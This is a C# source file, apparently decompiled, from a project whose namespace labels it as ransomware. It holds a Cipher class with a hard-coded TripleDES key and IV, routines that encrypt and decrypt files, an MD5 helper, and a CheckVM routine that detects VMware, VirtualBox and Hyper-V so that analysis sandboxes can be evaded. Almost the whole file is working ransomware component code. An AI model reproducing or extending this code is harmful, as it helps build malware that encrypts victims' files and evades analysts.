using System;
using System.IO;
using System.Management;
using System.Security.Cryptography;
using System.Text;

namespace ransomware_or_somethink_idk;

internal static class Cipher
{
	public static byte[] IV = new byte[8] { 54, 224, 148, 107, 99, 29, 171, 219 };

	public static byte[] Key = new byte[24]
	{
		227, 192, 107, 97, 130, 19, 122, 45, 172, 13,
		149, 138, 249, 119, 163, 68, 179, 40, 149, 172,
		160, 10, 90, 130
	};

	public static bool EncryptFile(string inputFile, string outputFile)
	{
		try
		{
			using TripleDES tripleDES = TripleDES.Create();
			tripleDES.IV = IV;
			tripleDES.Key = Key;
			using FileStream fileStream2 = File.OpenRead(inputFile);
			using FileStream fileStream = new FileStream(outputFile, FileMode.Create, FileAccess.Write);
			using CryptoStream destination = new CryptoStream(fileStream, tripleDES.CreateEncryptor(), CryptoStreamMode.Write);
			fileStream.SetLength(0L);
			fileStream2.CopyTo(destination);
		}
		catch
		{
			return false;
		}
		return true;
	}

	public static bool DecryptFile(string inputFile, string outputFile)
	{
		try
		{
			using TripleDES tripleDES = TripleDES.Create();
			tripleDES.IV = IV;
			tripleDES.Key = Key;
			using FileStream stream = File.OpenRead(inputFile);
			using CryptoStream cryptoStream = new CryptoStream(stream, tripleDES.CreateDecryptor(), CryptoStreamMode.Read);
			using FileStream destination = new FileStream(outputFile, FileMode.Create, FileAccess.Write);
			cryptoStream.CopyTo(destination);
		}
		catch
		{
			return false;
		}
		return true;
	}

	public static string CreateMD5(string input)
	{
		using MD5 mD = MD5.Create();
		byte[] bytes = Encoding.ASCII.GetBytes(input);
		byte[] array = mD.ComputeHash(bytes);
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < array.Length; i++)
		{
			stringBuilder.Append(array[i].ToString("X2"));
		}
		return stringBuilder.ToString();
	}

	public static bool CheckVM()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher("Select * from Win32_ComputerSystem");
		try
		{
			ManagementObjectCollection val2 = val.Get();
			try
			{
				ManagementObjectEnumerator enumerator = val2.GetEnumerator();
				try
				{
					while (enumerator.MoveNext())
					{
						ManagementBaseObject current = enumerator.get_Current();
						string text = current.get_Item("Manufacturer").ToString()!.ToLower();
						if ((text == "microsoft corporation" && current.get_Item("Model").ToString()!.ToUpperInvariant().Contains("VIRTUAL")) || text.Contains("vmware") || current.get_Item("Model").ToString() == "VirtualBox")
						{
							return true;
						}
					}
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val2)?.Dispose();
			}
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
		return false;
	}
}
